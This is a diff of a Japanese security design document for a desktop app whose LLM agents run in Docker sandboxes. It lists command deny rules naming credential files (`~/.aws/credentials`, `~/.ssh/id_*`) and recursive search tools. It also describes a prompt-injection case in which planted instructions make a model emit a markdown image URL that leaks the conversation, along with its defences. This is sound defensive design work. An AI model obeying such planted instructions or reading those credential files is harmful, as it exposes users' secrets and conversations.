@@ -7,7 +7,9 @@
 | API キー | 生値は `secrets.rs` の外へ出さない。フロントエンドには登録有無(bool)だけ返す | `services/secrets.rs` |
 | ファイルパス | ナレッジのパスはすべてサンドボックスを通す。LLM 出力・フロントエンドのパスを直接 `fs` に渡さない | `utils/path.rs` |
 | コマンド実行 | 静的判定 + 計画承認 + 個別承認 + 範囲制限 + タイムアウト + 中断 | `services/command_policy.rs` ほか |
-| サンドボックス | 全体設定で有効にすると、全エージェントの作業をエージェントごとの Docker コンテナ内の Claude Code で行う(マウントは担当フォルダとナレッジだけ)。認証情報は `sandbox.env` と AWS の一時キーを指示ごとに環境変数で渡す | `services/sandbox.rs`、[sandbox.md](sandbox.md) |
+| サンドボックス | ワークのエージェントは常に(パーソナルとリーダーは Bedrock 方式のときだけ)、作業をエージェントごとの Docker コンテナ内の Claude Code で行う(マウントは担当フォルダとナレッジだけ)。認証情報は `sandbox.env` と AWS の一時キーを指示ごとに環境変数で渡す | `services/sandbox.rs`、[sandbox.md](sandbox.md) |
+| 画面(WebView) | Content Security Policy で、画像・通信・スクリプトの読み込み先をアプリ自身に限る。Markdown の画像は読み込まない | `tauri.conf.json`、`components/ChatMarkdown.tsx` |
+| 取得物 | Whisper・VOICEVOX・ローカル LLM は、既定のバージョンを固定し SHA-256 を照合する | `services/stt.rs`、`services/voicevox.rs`、`services/local_llm.rs` |
 | プロンプトインジェクション | 外部由来の文章は「参考データ」として渡し、中の指示には従わせない | 各プロンプト |
 | ワークスペースの分離 | DB・API キー・AWS の状態・ナレッジの保存先をワークスペースごとに分け、混ぜない | `services/workspace.rs` |
 | コミット | `secrets.json`、`timeline.db`、`.env*` をコミットしない | — |
@@ -73,15 +75,30 @@
 
 [agent-command-tasks.md](agent-command-tasks.md) と [command-policy.md](command-policy.md) を参照。
 
-1. 構文解析による静的な判定(`rm`・`sudo`・OS に影響するコマンド・機密ファイル・システム領域の拒否を初期値に持つ)。
+1. 構文解析による静的な判定(`rm`・`sudo`・OS に影響するコマンド・機密ファイル(`secrets.json`、`~/.aws/credentials`、`~/.ssh/id_*` など)・システム領域の拒否を初期値に持つ)。
 2. 状態を変える作業は計画の承認が必須。計画外・破壊的なコマンドは個別承認。
 3. 読み取り系以外はナレッジのディレクトリ内に限る。
 4. タイムアウト(既定 60 秒、最大 600 秒)とプロセスグループごとの強制終了、ユーザーによる中断。
 5. 承認の待ち時間は 120 秒で、超えたら拒否。
 6. ポリシーファイルは隠しフォルダにあり、LLM のファイルツールから触れない。
-7. 全体設定で Docker サンドボックスを有効にすると、エージェントの作業は専用コンテナの中の Claude Code でだけ行われる。コンテナ内の Claude Code は渡された認証情報を読め、外向きの通信は制限しない([sandbox.md](sandbox.md) の既知の限界)。
+7. ワークのエージェント(と、Bedrock 方式のパーソナル)の作業は、専用コンテナの中の Claude Code でだけ行われる。コンテナ内の Claude Code は渡された認証情報を読め、外向きの通信は制限しない([sandbox.md](sandbox.md) の既知の限界)。
+8. アプリデータ(`secrets.json`・`timeline.db`・ほかのワークスペースのフォルダなど。自分のナレッジを除く)は、作業ディレクトリ・パス引数・ワイルドカード・シンボリックリンクのどれで指しても拒否する。アプリデータを含む範囲を再帰的に読むコマンド(`rg`、`grep -r`、`find -exec`)も拒否する。
+9. 読み取り系(許可リスト)でも、環境変数の前置き・変数やコマンド置換の引数・`xargs`・書き出しや別コマンド起動のオプション(`--output`、`-fprint`、`--pre`、`--ext-diff` など)があれば、承認なしでは実行しない。
+10. 計画外・破壊的なコマンドの個別承認と、許可リストへの追加は、画面のボタンでだけ承認できる(音声では拒否だけ)。許可リストにないコマンドは「今回だけ実行」を選べる。
 
 **限界**: 静的な検査のため、`python -c` の中身や実行時に決まるパスまでは見ない。サンドボックスを有効にしたエージェントは、コンテナの分離でこの限界を補う(ホスト上の他のデータはそもそも見えない)。
+
+## 画面(WebView)の守り
+
+- `tauri.conf.json` の Content Security Policy で、画像(`img-src`)・音声(`media-src`)・通信(`connect-src`)の先を、アプリ自身と `data:` / `blob:`、Tauri の IPC に限る。外部のURLは読み込めない。
+- Markdown(チャットの返答・ナレッジ・スキルの表示。`ChatMarkdown`)は、画像を読み込まずに説明だけを示す。ナレッジや Web ページに混入した指示で `![](https://…/?q=<会話の内容>)` を出力させても、表示しただけでは外へ送られない。リンクも開かない。
+- Mermaid の図は `securityLevel: "strict"`(図の中の HTML とクリックの動作を無効)で描く。描けない図はコードのまま見せる。
+
+## 取得物の検証
+
+- ローカル LLM(llama.cpp・Qwen)は、版と SHA-256 を固定して照合する([local-llm.md](local-llm.md))。
+- Whisper のモデルは、既定のリビジョン(コミットを固定)で取得し、SHA-256 を照合する。VOICEVOX(CORE・ONNX Runtime・辞書・音声モデル)も、既定のバージョンの取得物を SHA-256 で照合する。一致しなければ破棄して失敗にする(CORE と ONNX Runtime はプロセスに読み込むライブラリのため、差し替えられたものを読み込まない)。
+- 設定の「取得バージョン」で既定以外を指定した項目は、照合しない。設定画面にその旨の警告を出す。
 
 ## プライバシー
 
